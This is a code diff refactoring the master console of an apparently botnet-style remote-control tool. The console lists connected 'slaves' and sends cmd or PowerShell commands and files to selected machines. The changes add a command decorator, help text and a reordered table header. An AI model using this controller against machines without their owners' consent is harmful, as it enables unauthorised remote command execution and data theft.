@@ -1,7 +1,9 @@
+from click import command
 from src.client import Client
 import os
 import sys
 from rich.console import Console
+import inspect
 
 ARROW = '[#fc7a23]->[/] '
 
@@ -90,15 +92,22 @@ class MasterClient(Client):
 
     def execute(self, command):
         first_arg = command.split(' ')[0]
-        try:
-            if first_arg in ['master', 'console']:
-                raise AttributeError
-            func = getattr(self.commands, first_arg)
-        except AttributeError:
-            self.console.print(f"{ARROW}Unknown command!")
-            self.console.print(f"{ARROW}Type 'help' for a list of available commands.")
-        else:
-            func(command)
+
+        if first_arg != 'command':
+            try:
+                func = getattr(self.commands, first_arg)
+            except AttributeError:
+                pass
+            else:
+                try:
+                    is_command = func.__name__ == 'command'
+                except AttributeError:
+                    is_command = False
+                if is_command:
+                    func(command)
+                    return
+        self.console.print(f"{ARROW}Unknown command!")
+        self.console.print(f"{ARROW}Type 'help' for a list of available commands.")
 
     def command_loop(self):
         while True:
@@ -117,7 +126,41 @@ class Commands:
         self.master = master
         self.console = Console()
 
+    def command(func):
+        def command(*args, **kwargs):
+            res = func(*args, **kwargs)
+            return res
+        return command
+
+    def get_commands(self):
+        methods = inspect.getmembers(self, predicate=inspect.ismethod)
+        methods = [c[0] for c in methods if c[0] not in ['help', 'command']]
+        commands = {}
+        for method in methods:
+            try:
+                func = getattr(self, method)
+            except AttributeError:
+                continue
+            if func.__name__ == 'command':
+                commands.update({method: getattr(self, method)})
+        return commands
+
+    @command
+    def help(self, command):
+        self.console.print(f"{ARROW}Available commands:")
+        commands = self.get_commands()
+        for command in sorted(list(commands.keys())):
+            self.console.print(f"\t[bold green]{command}[/] ", end='')
+            commands[command](f'{command} --description')
+
+    @command
     def list(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Lists available slaves.")
+                return
+
         msg = {
             'type': 'slave_command',
             'recipients': 'all',
@@ -133,9 +176,6 @@ class Commands:
         os_version_len = 14
         addr_len = 22
 
-        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
-        self.console.print(f"|{'INDEX'.center(index_len)}|{'USERNAME'.center(username_len)}|{'HOSTNAME'.center(hostname_len)}|{'OS VER'.center(os_version_len)}|{'ADDRESS'.center(addr_len)}|")
-        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
         slaves = []
         for response in msg['responses']:
             if response['response']:
@@ -145,6 +185,10 @@ class Commands:
         if not slaves:
             self.console.print(f"{ARROW}[bold red]No slaves connected![/]")
             return False
+
+        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
+        self.console.print(f"|{'INDEX'.center(index_len)}|{'USERNAME'.center(username_len)}|{'HOSTNAME'.center(hostname_len)}|{'OS VER'.center(os_version_len)}|{'ADDRESS'.center(addr_len)}|")
+        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
         slaves.sort(key=lambda x: x['username'])
         for i, slave in enumerate(slaves):
             slave.update({'index': i})
@@ -155,7 +199,14 @@ class Commands:
         self.master.available_slaves = slaves
         return True
 
+    @command
     def select(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Selects slaves to send commands to.")
+                return
+
         command = command.split(' ')
         if len(command) == 1:
             if not self.list('list'):
@@ -178,7 +229,14 @@ class Commands:
             return
         self.master.selected_slaves = slaves
 
+    @command
     def selected(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Lists selected slaves.")
+                return
+
         if len(self.master.selected_slaves) == 0:
             self.console.print(f"{ARROW}[bold red]No slaves selected![/]")
             return
@@ -195,10 +253,25 @@ class Commands:
             self.console.print(f"|[bold yellow]{str(slave['index']).center(index_len)}[/]|[bold #8cfa16]{slave['username'].center(username_len)}[/]|[bold #16faef]{slave['hostname'].center(hostname_len)}[/]|[white]{slave['os_version'].center(os_version_len)}[/]|[white]{address.center(addr_len)}|[/]")
             self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
 
+    @command
     def clear(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Clears the console.")
+                return
+
         os.system('cls')
 
+    @command
     def cmd(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Sends a cmd command to the selected slaves.")
+                return
+
+
         command = " ".join(command.split()[1:])
         msg = {
             'type': 'slave_command',
@@ -222,7 +295,14 @@ class Commands:
                     for line in output:
                         print(f"\t{line}")
     
+    @command
     def powershell(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Sends a powershell command to the selected slaves.")
+                return
+
         command = " ".join(command.split()[1:])
         msg = {
             'type': 'slave_command',
@@ -246,11 +326,25 @@ class Commands:
                     for line in output:
                         print(f"\t{line}")
 
+    @command
     def exit(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Exits the program.")
+                return
+
         self.master.sock.close()
         sys.exit()
 
+    @command
     def sendfile(self, command):
+        args = command.split(' ')[1:]
+        if args:
+            if args[0] == '--description':
+                self.console.print(f"{ARROW}Sends a file to the selected slaves.")
+                return
+
         # command:  sendfile <file_path> -d [destination_path]
         args = command.split(' ')[1:]
         if len(args) < 1:
@@ -308,7 +402,6 @@ class Commands:
         self.master.send_dict(msg)
         msg = self.master.recieve_dict()
         if not msg: self.console.print("[bold red]No response from server.[/]")
-
 
 
 if __name__ == "__main__":
